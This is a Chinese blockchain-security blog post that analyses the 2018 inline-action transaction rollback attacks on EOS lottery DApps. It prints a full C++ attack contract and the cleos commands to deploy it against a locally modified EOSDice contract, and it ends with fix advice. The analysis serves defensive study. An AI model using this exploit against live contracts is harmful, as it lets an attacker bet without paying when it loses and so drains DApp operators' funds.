---
title: EOS DApp 漏洞分析 - inline action 交易回滚攻击
date: 2019-05-16 23:03:59
permalink: eos-DApp-revert
category:
    - 区块链安全
tags:
    - 回滚攻击
author: 零时科技
---

在去年（2018年）多个 EOS DAPP 发生了交易回滚攻击，这也是很典型的攻击方式，针对这个漏洞，深入浅出区块链社区伙伴零时科技安全团队进行了详细的分析及攻击过程复盘。

<!-- more -->

## 背景

2018年12月，EOS上多个抽奖 DApp 被黑客攻击。黑客是采用了 `inline action` 回滚攻击的技术实施攻击，并获利数千EOS。

## 技术点：action 

有一些EOS 抽奖类 DApp 采用了 `inline action` 方式进行开奖，导致被黑客攻击。
我们先来看一下 `inline action`和`defer action`分别是什么：

> action就是EOS上消息（EOS系统是以消息通信为基础的）的载体。如果想调用某个[智能合约](https://learnblockchain.cn/2018/01/04/understanding-smart-contracts/)，那么就要给它发 `action` 消息。

* **inline action**
    内联交易：多个不同的`action`在一个`transaction`中（在一个交易中触发了后续多个 Action ），在这个 `transaction` 中，只要有一个 `action` 异常，则整个`transaction` 会失败，所有的 `action` 都将会回滚。

* **defer action**
    延迟交易：两个不同的`action`在两个`transaction`中，每个`action`的状态互相不影响。
    
## 攻击技术分析

了解了上述知识之后，我们分析来黑客攻击流程：
* 首先，部署自己的攻击合约；
* 其次，在合约中进行下注操作；
* 随后，使用 `inline action` 查询自己的余额判断是否中奖，若未中奖，则抛出异常。此时，由于下注 `action` 和攻击的 `action` 在同一 `transaction` 中，那么，攻击`action`异常会导致下注的失败。那么黑客可以实现不中奖就不用付出EOS。

### 攻击合约
下面，我们给出攻击的测试合约

```c++
#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public:
        attack(account_name self):eosio::contract(self)
        {}

        //@abi action
        void rollback(asset in)
        {
            require_auth(_self);
            asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
            eosio_assert(in.amount > pool.amount, "rollback");
        }

        //@abi action
        void hi(asset bet)
        {
            require_auth(_self);
            asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
            std::string memo = "dice-noneage-66-user";
			action(
                permission_level(_self, N(active)),
                N(eosio.token), N(transfer),
                std::make_tuple(_self, N(eosbocai2222), bet, memo)
            ).send();

            action(
               permission_level{_self, N(active)},
                _self, N(rollback),
                std::make_tuple(pool)
            ).send();
        }
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (hi)(rollback)
)
```

由于开源的抽奖EOS DApp 采用 `inline action` 的较少，因此我们将 `EOSDice` 合约开奖的 `defer action` 改为了 `inline action` 来做测试。

### 攻击测试流程

1. 创建相关账户并设置权限

    ```bash
    # 创建攻击者相关账户权限
    cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
    cleos set account permission attacker active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"attacker","permission":"eosio.code"},"weight":1}]}' owner -p attacker
    ```


2. 向相关账户发送代币

    ```bash
    cleos push action eosio.token issue '["attacker", "10000.0000 EOS", "memo"]' -p eosio
    cleos push action eosio.token issue '["eosbocai2222", "10000.0000 EOS", "memo"]' -p eosio
    
    ```

3. 编译并部署相关合约

    ```bash
    # 编译攻击合约
    eosiocpp -o attack.wast attack.cpp
    eosiocpp -g attack.abi attack.cpp
    # 部署攻击合约
    cleos set contract attacker ~/attack -p attacker@owner
    
    # 编译EOSDICE合约
    eosiocpp -o eosdice.wast eosbocai2222.cpp
    eosiocpp -g eosdice.abi eosbocai2222.cpp
    
    # 部署EOSDICE合约
    cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@owner
    cleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner

    ```

4. 初始化测试合约

    ```bash 
    cleos push action eosbocai2222 init '[""]' -p eosbocai2222
    
    ```

5. 使用合约攻击测试DApp

    ```bash
    cleos push action attacker hi '["1.0000 EOS"]' -p attacker@owner
    ```

![攻击开奖成功](https://img.learnblockchain.cn/2019/05/15580205427769_r6mgx0skw18celvz.jpg)


上图是开奖成功的正常流程

![开奖失败](https://img.learnblockchain.cn/2019/05/15580205661972_u7j8bkza7fmrmrco.jpg)


上图是开奖失败，合约攻击合约抛出异常，转账事务发生回滚。

![](https://img.learnblockchain.cn/2019/05/15580205968951_8orm558sidinc3in.jpg)


## 推荐修复方法

在抽奖DApp使用 `defer action` 进行开奖可以避免本文分析的`inline action`交易回滚攻击，但是**链上开奖机制或许也不再安全**。建议使用链下开奖逻辑进行开奖。


本文所有过程均在本地测试节点完成，文章用到的所有代码在[NoneAge Github](https://github.com/NoneAge/EOS_DApp_Security_Incident_Analysis)。

本文由深入浅出区块链社区合作伙伴-[零时科技安全团队](http://www.noneage.com/)提供。

[深入浅出区块链](https://learnblockchain.cn/) - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。
